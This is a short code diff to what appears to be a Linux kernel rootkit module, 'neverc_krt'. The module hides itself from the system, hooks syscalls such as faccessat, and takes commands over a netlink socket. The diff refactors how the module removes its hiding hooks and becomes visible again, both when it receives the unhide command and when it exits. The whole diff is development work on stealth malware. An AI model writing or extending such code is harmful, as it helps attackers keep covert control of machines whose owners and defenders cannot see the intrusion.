@@ -10,6 +10,7 @@
 #include <nvk_netlink.h>
 #include <nvk_file.h>
 #include <nvk_compat.h>
+#include <nvk_cpu.h>
 #include <nvk_anti.h>
 #include <nvk_addr.h>
 #include <nvk_vma.h>
@@ -141,7 +142,8 @@ static void nl_handler(struct neverc_krt_nl_sock *ns, u32 pid,
 		break;
 
 	case CMD_UNHIDE:
-		_neverc_krt_hide_cleanup(&hide_state, &__this_module);
+		neverc_krt_hide_remove_hooks();
+		neverc_krt_mod_show(&hide_state, &__this_module);
 		neverc_krt_nl_reply(ns, pid, seq, "ok", 3);
 		neverc_krt_log_info("visible\n");
 		break;
@@ -316,7 +318,8 @@ static void neverc_krt_full_exit(void)
 		neverc_krt_hook_remove(&faccessat_hook);
 #endif
 
-	_neverc_krt_hide_cleanup(&hide_state, &__this_module);
+	neverc_krt_hide_remove_hooks();
+	neverc_krt_mod_show(&hide_state, &__this_module);
 
 	neverc_krt_log_info("unloaded\n");
 }
